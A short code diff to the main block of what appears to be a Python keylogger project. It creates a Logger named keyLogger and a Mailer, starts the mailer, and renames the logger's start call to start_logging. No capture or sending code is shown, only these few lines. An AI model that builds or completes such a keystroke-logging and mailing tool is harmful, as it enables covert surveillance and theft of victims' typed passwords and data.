@@ -7,5 +7,5 @@ if __name__ == "__main__":
 	keyLogger = Logger()
 	mailer = Mailer()
 	mailer.start()
-	keyLogger.start()
+	keyLogger.start_logging()
 	
